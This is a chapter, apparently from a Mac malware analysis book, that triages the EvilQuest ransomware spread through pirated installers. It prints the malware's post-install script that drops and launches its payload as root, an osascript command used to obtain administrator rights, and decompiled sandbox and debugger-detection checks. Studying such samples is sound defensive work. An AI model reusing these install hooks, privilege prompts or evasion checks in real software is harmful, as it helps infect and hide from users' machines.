<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 10: EvilQuest’s Infection, Triage, and Deobfuscation</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:a248aa67-aa2c-49b1-a34e-c916914c0e30" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_221" title="221"/>10</span><br/>
<span class="ChapterTitle">EvilQuest’s Infection, Triage, and Deobfuscation</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">EvilQuest is a complex Mac malware specimen. Because it employs anti-analysis logic, a viral persistence mechanism, and insidious payloads, it’s practically begging to be analyzed. Let’s apply the skills you’ve gained from this book to do just that! </p>
<p>This chapter begins our comprehensive analysis of the malware by detailing its infection vector, triaging its binary, and identifying its anti-analysis logic. <span class="xref" itemid="xref_target_Chapter 11">Chapter 11</span> will continue our analysis by covering the malware’s methods of persistence and its myriad of capabilities. </p>
<h2 id="h1-501942c10-0001">The Infection Vector</h2>
<p class="BodyFirst">Much like a biological virus, identifying a specimen’s infection vector is frequently the best way to understand its potential impact and thwart its continued spread. So, when you’re analyzing a new malware specimen, <span epub:type="pagebreak" id="Page_222" title="222"/>one of your first goals is answering the question, “How does the malware infect Mac systems?” </p>
<p>As you saw in <span class="xref" itemid="xref_target_Chapter 1">Chapter 1</span>, malware authors employ a variety of tactics, ranging from unsophisticated social engineering attacks to powerful zero-day exploits, to infect Mac users. Dinesh Devadoss, the researcher who discovered EvilQuest, did not specify how the malware was able to infect Mac users.<sup class="endnote"><a href="#c10-endnote-1" id="c10-noteref-1">1</a></sup> However, another researcher, Thomas Reed, later noted that the malware had been found in pirated versions of popular macOS software shared on torrent sites. Specifically, he wrote about</p>
<blockquote class="review">
<p class="Blockquote">an apparently malicious Little Snitch installer available for download on a Russian forum dedicated to sharing torrent links. A post offered a torrent download for Little Snitch, and was soon followed by a number of comments that the download included malware. In fact, we discovered that not only was it malware, but a new Mac ransomware variant spreading via piracy.<sup class="endnote"><a href="#c10-endnote-2" id="c10-noteref-2">2</a></sup></p></blockquote>
<p>Distributing pirated or cracked applications that have been maliciously trojanized is a fairly common method of targeting macOS users for infection. Though not the most sophisticated approach, it is rather effective, as many users have a distaste for paid software and instead seek out pirated alternatives. <a href="#figure10-1" id="figureanchor10-1">Figure 10-1</a> shows the download link for the malicious Little Snitch software. </p>
<figure>
<img alt="The webpage for pirating Little Snitch contains information about the software, such as the year—2020—the version, developer, description, and so on. At the bottom of the screen is a link to “Download the distribution by magnet link (59.3 MB).” Beneath the link is a warning: “Your Internet Provider and Government can see what you are downloading. Don’t forget to hide your IP with VPN to avoid fines and lawsuits!” Links to NordVPN, ExpressVPN, and others are directly below." class="keyline" src="image_fi/501942c10/f10001.png"/>
<figcaption><p><a id="figure10-1">Figure 10-1</a>: Pirated version of Little Snitch trojanized with EvilQuest </p></figcaption>
</figure>
<p>Of course, this infection vector requires user interaction. Specifically, in order to become infected with EvilQuest, users would have to download and run an infected application. Moreover, as you’ll see, the malware’s installer package is unsigned, so users on recent versions of macOS may have to proactively take steps to bypass system notarization checks. </p>
<p><span epub:type="pagebreak" id="Page_223" title="223"/>In an attempt to infect as many Mac users as possible, the malware authors surreptitiously trojanized many different pirated applications distributed via torrent sites. In this chapter, we’ll focus on a sample that was maliciously packaged up with the popular DJ application Mixed In Key.<sup class="endnote"><a href="#c10-endnote-3" id="c10-noteref-3">3</a></sup></p>
<h2 id="h1-501942c10-0002">Triage</h2>
<p class="BodyFirst">Recall that an application is actually a special directory structure called a <em>bundle</em> that must be packaged up before being distributed. The sample of EvilQuest we’re analyzing here was distributed as a disk image, <em>Mixed In Key 8.dmg</em>. As shown in <a href="#figure10-2" id="figureanchor10-2">Figure 10-2</a>, when first discovered, this sample’s SHA-256 hash (B34738E181A6119F23E930476AE949FC0C7C4DED6EFA003019FA946C4E5B287A) was not flagged as malicious by any of the antivirus engines on the aggregate scanning site VirusTotal.</p>
<figure>
<img alt="Mixed In Key 8.dmg is shown to have a score of 0/58 on VirusTotal." class="keyline" src="image_fi/501942c10/f10002.png"/>
<figcaption><p><a id="figure10-2">Figure 10-2</a>: The trojanized <em>Mixed </em><em>In</em><em> Key 8.dmg</em> file on VirusTotal</p></figcaption>
</figure>
<p>Of course, today this disk image is widely detected as containing malware.</p>
<h3 id="h2-501942c10-0001">Confirming the File Type</h3>
<p class="BodyFirst">As analysis tools are often file-type specific and malware authors may attempt to mask the true file type of their malicious creations, it is wise to first determine or confirm a file’s true type when you are presented with a potentially malicious specimen. Here we attempt to use the <code>file</code> utility to confirm that the trojanized <em>Mixed In Key 8.dmg</em> is indeed a disk image. </p>
<pre><code>% <b>file "EvilQuest/Mixed In Key 8.dmg"</b><br/><br/>Mixed In Key 8.dmg: zlib compressed data</code></pre>
<p>Oops, looks like the <code>file</code> utility misidentified the file as something other than a disk image. This is unsurprising, as disk images compressed with zlib are often reported as “VAX COFF” due to the zlib header.<sup class="endnote"><a href="#c10-endnote-4" id="c10-noteref-4">4</a></sup></p>
<p>Let’s try again, this time using my WhatsYourSign (WYS) utility, which shows an item’s code-signing information and more accurately identifies the item’s file type. As you can see in <a href="#figure10-3" id="figureanchor10-3">Figure 10-3</a>, the tool’s Item Type field confirms that <em>Mixed In Key 8.dmg</em> is indeed a disk image, as expected.</p>
<span epub:type="pagebreak" id="Page_224" title="224"/><figure>
<img alt="In the WhatsYourSign tool, Mixed In Key 8.dmg contains the following information: “Item Type: Disk Image,” “Entitled: None,” and “Sign Auths: unsigned (‘errSecCSUnsigned’).”" class="" src="image_fi/501942c10/f10003.png"/>
<figcaption><p><a id="figure10-3">Figure 10-3</a>: WYS confirms the item as a disk image</p></figcaption>
</figure>
<h3 id="h2-501942c10-0002">Extracting the Contents</h3>
<p class="BodyFirst">Once we’ve confirmed that this <em>.dmg</em> file is indeed a disk image, our next task is to extract the disk image’s contents for analysis. Using macOS’s built-in <code>hdiutil</code> utility, we can mount the disk image to access its files:</p>
<pre><code>% <b>hdiutil attach -noverify "EvilQuest/Mixed In Key 8.dmg"</b><br/>/dev/disk2            GUID_partition_scheme <br/>/dev/disk2s1          Apple_APFS<br/>/dev/disk3            EF57347C-0000-11AA-AA11-0030654 <br/>/dev/disk3s1          41504653-0000-11AA-AA11-0030654 /Volumes/Mixed In Key 8</code></pre>
<p>Once this command has completed, the disk image will be mounted to <em>/Volumes/Mixed In Key 8/</em>. Listing the contents of this directory reveals a single file, <em>Mixed In Key 8.pkg</em>, which appears to be an installer package (<a href="#listing10-1" id="listinganchor10-1">Listing 10-1</a>):</p>
<pre><code>% <b>ls "/Volumes/Mixed In Key 8"</b><br/>Mixed In Key 8.pkg</code></pre>
<p class="CodeListingCaption"><a id="listing10-1">Listing 10-1</a>: Listing the mounted disk image’s contents</p>
<p>We again turn to WYS to confirm that the <em>.pkg</em> file is indeed a package, and also to check the package’s signing status. As you can see in <a href="#figure10-4" id="figureanchor10-4">Figure 10-4</a>, the <em>.pkg </em>file type is confirmed, though the package is unsigned. </p>
<figure>
<img alt="In the WhatsYourSign tool, Mixed In Key 8.dmg shows the following information: “Item Type: Installer package archive,” “Entitled: none,” “Sign Auths: unsigned (‘errSecCSUnsigned’).”" class="" src="image_fi/501942c10/f10004.png"/>
<figcaption><p><a id="figure10-4">Figure 10-4</a>: WYS confirms the item as an unsigned package</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_225" title="225"/>We can also check any package signatures (or lack thereof) from the terminal with the <code>pkgutil</code> utility. Just pass in <code>--check-signature</code> and the path to the package, as shown in <a href="#listing10-2" id="listinganchor10-2">Listing 10-2</a>:</p>
<pre><code>% <b>pkgutil --check-signature "/Volumes/Mixed In Key 8/Mixed In Key 8.pkg"</b><br/>Package "Mixed In Key 8.pkg":<br/>   Status: no signature</code></pre>
<p class="CodeListingCaption"><a id="listing10-2">Listing 10-2</a>: Checking the package’s signature </p>
<p>As the package is unsigned, macOS will prompt the user before allowing it to be opened. However, users attempting to pirate software will likely ignore this warning, pressing onwards and inadvertently commencing the infection.</p>
<h3 id="h2-501942c10-0003">Exploring the Package</h3>
<p class="BodyFirst">In <span class="xref" itemid="xref_target_Chapter 4">Chapter 4</span> we discussed using the Suspicious Package utility to explore the contents of installer packages. Here we’ll use it to open <em>Mixed In Key 8.pkg</em> (<a href="#figure10-5" id="figureanchor10-5">Figure 10-5</a>). In the All Files tab, we’ll find an application named <em>Mixed In Key 8.app</em> and an executable file simply named <em>patch</em>.</p>
<figure>
<img alt="In the Suspicious Package tool, Mixed In Key 8.dmg is shown to contain an Applications folder with the Mixed In Key 8.app file and a Utils folder that contains an executable file named Patch." class="" src="image_fi/501942c10/f10005.png"/>
<figcaption><p><a id="figure10-5">Figure 10-5</a>: Using Suspicious Package to explore files within the trojanized <em>Mixed in Key</em> package </p></figcaption>
</figure>
<p>We’ll triage these files shortly, but first we should check for any pre- or post-install scripts. Recall that when a package is installed, any such scripts will also be automatically executed. As such, if an installer package contains malware, you’ll often find malicious installer logic within these scripts.</p>
<p><span epub:type="pagebreak" id="Page_226" title="226"/>Clicking the <b>All Scripts</b> tab reveals that <em>Mixed In Key 8.pkg</em> does contain a post-install script (<a href="#listing10-3" id="listinganchor10-3">Listing 10-3</a>):</p>
<pre><code>#!/bin/sh<br/>mkdir /Library/mixednkey<br/><br/>mv /Applications/Utils/patch /Library/mixednkey/toolroomd<br/>rmdir /Application/Utils<br/><br/>chmod +x /Library/mixednkey/toolroomd<br/><br/>/Library/mixednkey/toolroomd &amp;</code></pre>
<p class="CodeListingCaption"><a id="listing10-3">Listing 10-3</a>: <em>Mixed </em><em>In</em><em> Key 8.pkg</em>’s post-install script</p>
<p>When the trojanized <em>Mixed In Key 8.pkg</em> is installed, the script will be executed and performs the following:</p>
<ol class="decimal">
<li value="1">Create a directory named <em>/Library/mixednkey</em>.</li>
<li value="2">Move the<em> patch</em> binary (which was installed to <em>/Applications/Utils/patch</em>) into the newly created <em>/Library/mixednkey</em> directory as a binary named <em>toolroomd</em>.</li>
<li value="3">Attempt to delete the<em> /Applications/Utils/ </em>directory (created earlier in the install process). However, due to a bug in the command (the malware author missed the “s” in <em>/Applications</em>), this will fail.</li>
<li value="4">Set the <em>toolroomd</em> binary to be executable.</li>
<li value="5">Launch the <em>toolroomd</em> binary in the background.</li>
</ol>
<p>The installer requests root privileges during the install, so if the user provides the necessary credentials, this post-install script will also run with elevated privileges.</p>
<p>Through dynamic analysis monitoring tools, such as my ProcessMonitor and FileMonitor, we can passively observe this installation process, including the execution of the post-install script and the script’s commands (<a href="#listing10-4" id="listinganchor10-4">Listing 10-4</a>): </p>
<pre><code># <b>ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",<br/>  "process" : {<br/>    "uid" : 0,<br/>    "arguments" : [<br/>      "/bin/sh",<br/>      "/tmp/PKInstallSandbox.3IdCO8/.../com.mixedinkey.installer.u85NFq/postinstall",<br/>      "/Users/user/Desktop/Mixed In Key 8.pkg",<br/>      "/Applications",<br/>      "/",<br/>      "/"<br/>    ],<br/>    "ppid" : 1375,<br/>    "path" : "/bin/bash",<br/><span epub:type="pagebreak" id="Page_227" title="227"/>    "name" : "bash",<br/>    "pid" : 1377<br/>  },<br/>  ...<br/>}<br/><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",<br/>  "process" : { <br/>    "uid" : 0,<br/>    "arguments" : [<br/>      "mkdir", <br/>      "/Library/mixednkey"<br/>    ],<br/>    "ppid" : 1377,<br/>    "path" : "/bin/mkdir",<br/>    "name" : "mkdir",<br/>    "pid" : 1378<br/>   }, <br/>   ... <br/>} <br/><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",<br/>  "process" : {<br/>    "uid" : 0, <br/>    "arguments" : [<br/>      "mv",<br/>      "/Applications/Utils/patch",<br/>      "/Library/mixednkey/toolroomd"<br/>    ],<br/>    "ppid" : 1377,<br/>    "path" : "/bin/mv",<br/>    "name" : "mv",<br/>    "pid" : 1379<br/>   }, <br/>    ... <br/>} <br/> <br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",<br/>  "process" : {<br/>    "uid" : 0,<br/>    "arguments" : [<br/>      "/Library/mixednkey/toolroomd" <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>    ],<br/>    "ppid" : 1,<br/>    "path" : "/Library/mixednkey/toolroomd",<br/>    "name" : "toolroomd",<br/>    "pid" : 1403<br/>  },<br/>...<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing10-4">Listing 10-4</a>: Monitoring the actions of the malicious post-install script</p>
<p><span epub:type="pagebreak" id="Page_228" title="228"/>In this abridged output from ProcessMonitor, you can see various commands from the post-install script, such as <code>mkdir</code> and <code>mv</code>, being executed as the malware is installed. Most notably, observe that at its completion the script executes the malware, now installed as <em>toolroomd</em> <span aria-label="annotation1" class="CodeAnnotation">1</span>.</p>
<p>Let’s now extract both the <em>Mixed In Key 8</em> application and <em>patch</em> binary from the package using Suspicious Package by exporting each file. First, let’s take a peek at the <em>Mixed In Key 8</em> application. By using WYS, we can see that it is still validly signed by the Mixed In Key developers (<a href="#figure10-6" id="figureanchor10-6">Figure 10-6</a>).</p>
<figure>
<img alt="In the WhatsYourSign tool, Mixed In Key 8.app is declared to be “validly signed,” with the signer listed as “Apple Dev-ID.” More information is available under sign auth: “Developer ID Application: Mixed In Key, LLC (T4A2E2DEM7),” “Developer ID Certification Authority,” “Apple Root CA.”" class="" src="image_fi/501942c10/f10006.png"/>
<figcaption><p><a id="figure10-6">Figure 10-6</a>: The still validly signed application (via WYS) </p></figcaption>
</figure>
<p>Confirming the validity of an item’s code-signing signature tells us that it has not been modified or tampered with since being signed. </p>
<p>Could the malware authors have compromised Mixed In Key, stolen its code-signing certificate, surreptitiously modified the application, and then re-signed it? Fair question, and the answer is that it’s possible, though highly unlikely. If this were the case, the malware authors probably wouldn’t have had to resort to such an unsophisticated infection mechanism (distributing the software via shady torrent sites), nor would they have had to include another unsigned binary in the package.</p>
<p>As the main application remains validly signed by the developers, let’s turn our attention to the <em>patch</em> file. As you’ll see shortly, this is the malware. (Recall that it gets installed as a file called <em>toolroomd.</em>) Using the <code>file</code> utility we can determine that it is a 64-bit Mach-O binary, and the <code>codesign</code> utility indicates that it is unsigned:</p>
<pre><code>% <b>file patch</b><br/>patch: Mach-O 64-bit executable x86_64<br/><br/>% <b>codesign -dvv patch </b><br/>patch: code object is not signed at all</code></pre>
<p>As <em>patch</em> is a binary rather than, say, a script, we’ll continue our analysis by leveraging static analysis tools that are either file-type agnostic or specifically tailored toward binary analysis. </p>
<h2 id="h1-501942c10-0003"><span epub:type="pagebreak" id="Page_229" title="229"/>Extracting Embedded Information from the patch Binary</h2>
<p class="BodyFirst">First we’ll run the <code>strings</code> utility to extract any embedded ASCII strings, as these strings can often provide valuable insight into the malware’s logic and capabilities. Note that I’ve reordered the output for convenience (<a href="#listing10-5" id="listinganchor10-5">Listing 10-5</a>):</p>
<pre><code>% <b>strings - patch</b><br/><br/>2Uy5DI3hMp7o0cq|T|14vHRz0000013<br/>0ZPKhq0rEeUJ0GhPle1joWN30000033<br/>0rzACG3Wr||n1dHnZL17MbWe0000013<br/><br/>3iHMvK0RFo0r3KGWvD28URSu06OhV61tdk0t22nizO3nao1q0000033<br/>1nHITz08Dycj2fGpfB34HNa33yPEb|0NQnSi0j3n3u3JUNmG1uGElB3Rd72B0000033<br/>...<br/><br/>--reroot<br/>--silent<br/>--noroot<br/>--ignrp<br/><br/>Host: %s<br/>GET /%s HTTP/1.0<br/><br/>Encrypt<br/>file_exists<br/>_generate_xkey<br/><br/>[tab]<br/>[return]<br/>[right-cmd]<br/><br/>/toidievitceffe/libpersist/persist.c</code></pre>
<p class="CodeListingCaption"><a id="listing10-5">Listing 10-5</a>: Extracting embedded strings</p>
<p>Extracting the embedded strings reveals strings that appear to be command line arguments (like <code>--silent</code>), networking requests (like <code>GET /%s HTTP/1.0</code>), potential file-encryption logic (like <code>_generate_xkey</code>), and key mappings (like <code>[right-cmd]</code>), possibly indicating the presence of keylogging logic. We also uncover a path that contains a directory name (<em>toidievitceffe</em>) that unscrambles to “effectiveidiot.” Our continued analysis will soon reveal other strings and function names containing the abbreviation “ei” (such as <code>EI_RESCUE</code> and <code>ei_loader_main</code>). It seems likely that “effectiveidiot” is the moniker given to the malware by its developers.</p>
<p>The output from the <code>strings</code> utility reveals a large number of embedded strings (like <code>2Uy5DI3hMp7o0cq|T|14vHRz0000013</code>) that appear obfuscated. These nonsensical strings likely indicate that EvilQuest employs anti-analysis. Shortly we’ll break this anti-analysis logic to deobfuscate all such strings. First, though, let’s statically extract more information from the malware. </p>
<p>Recall that macOS’s built-in <code>nm</code> utility can extract embedded information, such as function names and system APIs invoked by the malware. Like <span epub:type="pagebreak" id="Page_230" title="230"/>the output of the <code>strings</code> utility, this information can provide insight into the malware’s capabilities and guide continued analysis. Let’s run <code>nm</code> on the <em>patch</em> binary, as in <a href="#listing10-6" id="listinganchor10-6">Listing 10-6</a>. Again, I’ve reordered the output for convenience:</p>
<pre><code>% <b>nm patch</b><br/>                 U _CGEventTapCreate<br/>                 U _CGEventTapEnable<br/><br/>                 U _NSAddressOfSymbol<br/>                 U _NSCreateObjectFileImageFromMemory<br/>                 U _NSLinkModule<br/>                ...<br/><br/>000000010000a550 T __get_host_identifier<br/>0000000100007c40 T __get_process_list<br/><br/>000000010000a170 T __react_exec<br/>000000010000a470 T __react_keys<br/>000000010000a300 T __react_save<br/>0000000100009e80 T __react_scmd<br/><br/>000000010000de60 T _eib_decode<br/>000000010000e010 T _eib_secure_decode<br/>0000000100013708 S _eib_string_key<br/><br/>000000010000e0d0 T _get_targets<br/>0000000100007310 T _eip_encrypt<br/>0000000100007130 T _eip_key<br/><br/>0000000100007aa0 T _is_debugging<br/>0000000100007c20 T _prevent_trace<br/>0000000100007bc0 T _is_virtual_mchn<br/><br/>0000000100008810 T _persist_executable<br/>0000000100009130 T _install_daemon</code></pre>
<p class="CodeListingCaption"><a id="listing10-6">Listing 10-6</a>: Extracting embedded names (API calls, functions, and so on)</p>
<p>First we see references to system APIs, such as <code>CGEventTapCreate</code> and <code>CGEventTapEnable</code>, often leveraged to capture user keypresses, as well as <code>NSCreateObjectFileImageFromMemory</code> and <code>NSLinkModule</code>, which can be used to execute binary payloads in memory. The output also contains a long list of function names that map directly back to the malware’s original source code. Unless these are named incorrectly to mislead us, they can provide insight into many aspects of the malware. For example,</p>
<ul>
<li><code>is_debugging</code>, <code>is_virtual_mchn</code>, and <code>prevent_trace</code> may indicate that the malware implements dynamic-analysis-thwarting logic.</li>
<li><code>get_host_identifier</code> and <code>get_process_list</code> may indicate host survey capabilities.</li>
<li><code>persist_executable</code> and <code>install_daemon</code> likely relate to how the malware persists. </li>
<li><span epub:type="pagebreak" id="Page_231" title="231"/><code>eib_secure_decode </code>and <code>eib_string_key</code> may be responsible for decoding the obfuscated strings.</li>
<li><code>get_targets</code>, <code>is_target</code>, and <code>eip_encrypt</code> could contain the malware’s purported ransomware logic. </li>
<li>The <code>react_*</code> functions (such as <code>react_exec</code>) possibly contain the logic to execute remote commands from the attacker’s command and control server. </li>
</ul>
<p>Of course, we should verify this functionality during static or dynamic analysis. However, these names alone can help focus our continued analysis. For example, it would be wise to statically analyze what appear to be various anti-analysis functions before beginning a debugging session, as those functions may attempt to thwart the debugger and thus would need to be bypassed.</p>
<h2 id="h1-501942c10-0004">Analyzing the Command Line Parameters</h2>
<p class="BodyFirst">Armed with the myriad of intriguing information collected during our static analysis triage, it’s time to dig a little deeper. We can disassemble the <em>patch</em> binary by loading it into a disassembler, such as Hopper. A quick triage of the disassembler code reveals that the core logic of the <em>patch</em> binary occurs within its main function, which is rather extensive. First the binary parses any command line parameters looking for <code>--silent</code>, <code>--noroot</code>, and <code>--ignrp</code>. If these command line arguments are present, various flags are set. If we then analyze code that references these flags, we can ascertain their meaning. </p>
<h3 id="h2-501942c10-0004">--silent</h3>
<p class="BodyFirst">If <code>--silent</code> is passed in via the command line, the malware sets a global variable to 0. This appears to instruct the malware to run “silently,” for example suppressing the printing of error messages. In the following snippet of disassembly, the value of a variable (which I’ve named <code>silent</code> below) is first checked via the <code>cmp</code> instruction. If it is set, the malware will jump over the call to the <code>printf</code> function so that an error message is not displayed. </p>
<pre><code>0x000000010000c375    cmp        [rbp+silent], 1<br/>0x000000010000c379    jnz        skipErrMsg<br/>...<br/>0x000000010000c389    lea        rdi, "This application has to be run by root"<br/>0x000000010000c396    call       printf</code></pre>
<p>This flag is also passed to the <code>ei_rootgainer_main</code> function, which influences how the malware (running as a normal user) may request root privileges. Note, in the following disassembly, that the address of the flag is loaded into the <code>RDX</code> register, which holds the third argument in the context of a function call:</p>
<pre><code>0x000000010000c2eb    lea        rdx, [rbp+silent]<br/>0x000000010000c2ef    lea        rcx, [rbp+var_34]<br/>0x000000010000c2f3    call       ei_rootgainer_main</code></pre>
<p><span epub:type="pagebreak" id="Page_232" title="232"/>Interestingly, this flag is explicitly initialized to 0 (and set to 0 again if the <code>--silent</code> parameter is specified). It appears to never be set to 1 (true). Thus, the malware will always run in “silent” mode, even if <code>--silent</code> is not specified. It’s possible that, in a debug build of the malware, the flag could be initialized to 1 as the default value. </p>
<p>To acquire root privileges, the <code>ei_rootgainer_main</code> function calls into a helper function, <code>run_as_admin_async</code>, to execute the following (originally encrypted) command, substituting itself for the <code>%s</code>. </p>
<pre><code>osascript -e "do shell script \"sudo %s\" with administrator privileges" </code></pre>
<p>This results in an authentication prompt from the macOS built-in <code>osascript</code> (<a href="#figure10-7" id="figureanchor10-7">Figure 10-7</a>). </p>
<figure>
<img alt="The authentication prompt states, “osascript wants to make changes. Enter your password to allow this.”" class="" src="image_fi/501942c10/f10007.png"/>
<figcaption><p><a id="figure10-7">Figure 10-7</a>: The malware’s authentication prompt, via <span class="LiteralInCaption"><code>osascript</code></span></p></figcaption>
</figure>
<p>If the user provides appropriate credentials, the malware will have gained root privileges. </p>
<h3 id="h2-501942c10-0005">--noroot</h3>
<p class="BodyFirst">If <code>--noroot</code> is passed in via the command line, the malware sets another flag to 1 (true). Various code within the malware then checks this flag and, if it is set, takes different actions, such as skipping the request for root privileges. In the snippet of disassembled code, note that if the flag (initially <code>var_20</code> but named <code>noRoot</code> here) is set, the call to the <code>ei_rootgainer_main</code> function is skipped. </p>
<pre><code>0x000000010000c2d6    cmp        [rbp+noRoot], 0<br/>0x000000010000c2da    jnz        noRequestForRoot<br/>...<br/>0x000000010000c2f3    call       ei_rootgainer_main</code></pre>
<p>The <code>--noroot</code> argument is also passed to a persistence function, <code>ei_persistence_main</code>: </p>
<pre><code>0x000000010000c094    mov        ecx, [rbp+noRoot]<br/>0x000000010000c097    mov        r8d, [rbp+var_24]<br/>0x000000010000c09b    call       _ei_persistence_main</code></pre>
<p><span epub:type="pagebreak" id="Page_233" title="233"/>Subsequent analysis of this function reveals that this flag dictates how the malware persists; either as a launch daemon or a launch agent. Recall that persisting as a launch daemon requires root privileges, whereas persisting as a launch agent requires only user privileges.</p>
<h3 id="h2-501942c10-0006">--ignrp</h3>
<p class="BodyFirst">If <code>--ignrp</code> (“ignore persistence”) is passed in via the command line, the malware sets a flag to 1 and instructs itself not to manually start any persisted launch items.</p>
<p>We can confirm this by examining disassembled code in the <code>ei_selfretain_main</code> function, which contains logic to load persisted components. This function first checks the flag (named <code>ignorePersistence</code> here) and, if it’s not set, the function simply returns without loading the persisted items:</p>
<pre><code>0x000000010000b786    cmp        [rbp+ignorePersistence], 0<br/>0x000000010000b78a    jz         leave</code></pre>
<p>Note that, even if the <code>--ignrp</code> command line option is specified, the malware itself will still persist and thus be automatically restarted each time an infected system is rebooted or the user logs in.</p>
<h2 id="h1-501942c10-0005">Analyzing Anti-Analysis Logic</h2>
<p class="BodyFirst">If a malicious sample contains anti-analysis logic, we must identify and thwart it to continue our analysis. Luckily for us, other than what appear to be encrypted strings, EvilQuest does not seem to employ any methods that will hinder our static analysis efforts. However, we’re not so lucky when it comes to dynamic analysis. </p>
<p>As noted in <span class="xref" itemid="xref_target_Chapter 9">Chapter 9</span>, a sample prematurely exiting when run in a virtual machine or debugger likely indicates that some sort of dynamic anti-analysis logic was triggered. If you try to run EvilQuest in a debugger, you’ll notice that it simply terminates. This isn’t surprising; recall that the malware contains functions with names such as <code>is_debugging</code> and <code>prevent_trace</code>. A function named <code>is_virtual_mchn</code> is also invoked before these likely anti-debugger functions. Let’s begin our analysis of what appears to be the malware’s anti-analysis logic there. </p>
<h3 id="h2-501942c10-0007">Virtual Machine–Thwarting Logic?</h3>
<p class="BodyFirst">In your disassembler, take a look at <code>0x000000010000be5f</code> in the main function. Once the malware has processed any command line options, it invokes a function named <code>is_virtual_mchn</code>. As shown in the following snippet of decompiled code, the malware will prematurely exit if this function returns a nonzero value: </p>
<pre><code>if(is_virtual_mchn(0x2) != 0x0) {<br/>    exit(-1);<br/>}</code></pre>
<p><span epub:type="pagebreak" id="Page_234" title="234"/>Let’s take a closer look at the decompilation of this function (<a href="#listing10-7" id="listinganchor10-7">Listing 10-7</a>), as we want to ensure the malware runs (or can be coerced to run) in a virtual machine, such that we can analyze it dynamically.</p>
<pre><code>int is_virtual_mchn(int arg0) {<br/><br/>   var_10 = time();<br/>   sleep(argO);<br/>   rax = time();<br/>   rdx = 0x0;<br/><br/>   if (rax - var_10 &lt; arg0) {<br/>      rdx = 0x1;<br/>   }<br/><br/>   rax = rdx;<br/>   return rax;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing10-7">Listing 10-7</a>: Anti-sandbox check, through time checks</p>
<p>As you can see in the decompilation of <code>is_virtual_mchn</code>, the <code>time</code> function is invoked twice, with a call to <code>sleep</code> in between. It then compares the differences between the two calls to <code>time</code> to match the amount of time that the code slept for. This allows it to detect sandboxes that patch, or speed up, calls to <code>sleep</code>. As security researcher Clemens Kolbitsch has noted,</p>
<blockquote class="review">
<p class="Blockquote">Sandboxes will patch the sleep function to try to outmaneuver malware that uses time delays. In response, malware will check to see if time was accelerated. Malware will get the timestamp, go to sleep and then again get the timestamp when it wakes up. The time difference between the timestamps should be the same duration as the amount of time the malware was programmed to sleep. If not, then the malware knows it is running in an environment that is patching the sleep function, which would only happen in a sandbox.<sup class="endnote"><a href="#c10-endnote-5" id="c10-noteref-5">5</a></sup></p></blockquote>
<p>This means that, in reality, the <code>is_virtual_mchn</code> function is more of a sandbox check and will not actually detect a standard virtual machine, which doesn’t manipulate any time constructs. That’s good news for our continued analysis of the malware, which occurs within an isolated virtual machine. </p>
<h3 id="h2-501942c10-0008">Debugging-Thwarting Logic</h3>
<p class="BodyFirst">We also need to discuss the other anti-analysis mechanisms employed by the malware, as this logic could thwart our dynamic analysis efforts later. Recall that in the output of the <code>strings</code> utility, we saw what appeared to be anti-debugging functions: <code>is_debugging</code> and <code>prevent_trace</code>. </p>
<p>The <code>is_debugging</code> function is implemented at address <code>0x0000000100007aa0</code>. Looking at a snippet of annotated disassembly of this function in <a href="#listing10-8" id="listinganchor10-8">Listing 10-8</a>, <span epub:type="pagebreak" id="Page_235" title="235"/>we see the malware invoking the <code>sysctl</code> function with <code>CTL_KERN</code>, <code>KERN_PROC</code>, <code>KERN_PROC_PID</code>, and its PID, obtained via the <code>getpid()</code> API function:</p>
<pre><code>_is_debugging:<br/>0x0000000100007aa0<br/>...<br/>0x0000000100007ae1    mov        dword [rbp+var_2A0], 0x1 ;CTL_KERN<br/>0x0000000100007aeb    mov        dword [rbp+var_29C], 0xe ;KERN_PROC<br/>0x0000000100007af5    mov        dword [rbp+var_298], 0x1 ;KERN_PROC_PID<br/>...<br/>0x0000000100007b06    call       getpid<br/>...<br/>0x0000000100007b16    mov        [rbp+var_294], eax ;process id (pid)<br/>...<br/>0x0000000100007b0f    lea        rdi, qword [rbp+var_2A0]<br/>...<br/>0x0000000100007b47    call       sysctl</code></pre>
<p class="CodeListingCaption"><a id="listing10-8">Listing 10-8</a>: The start of anti-debugging logic, via the <code>sysctl</code> API</p>
<p>Once the <code>sysctl</code> function has returned, the malware checks the <code>p_flag</code> member of the <code>info.kp_proc</code> structure populated by the call to <code>sysctl</code> to see whether it has the <code>P_TRACED</code> flag set (<a href="#listing10-9" id="listinganchor10-9">Listing 10-9</a>). As this flag is only set if the process is being debugged, the malware can use it to determine if it is being debugged. </p>
<pre><code>rax = 0x0;<br/>if ((info.kp_proc.p_flag &amp; 0x800) != 0x0) {<br/>    rax = 0x1;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing10-9">Listing 10-9</a>: Is the <code>P_TRACED</code> flag (<code>0x800</code>) set? If so, the process is being debugged.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	Does this <code>sysctl</code>/<code>P_TRACED</code> check look familiar? It should, as it’s a common anti-debugger check discussed in the previous chapter.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>If the <code>is_debugging</code> function detects a debugger, it returns a nonzero value, as shown in <a href="#listing10-10" id="listinganchor10-10">Listing 10-10</a>’s full reconstruction, which I’ve based on the decompilation.</p>
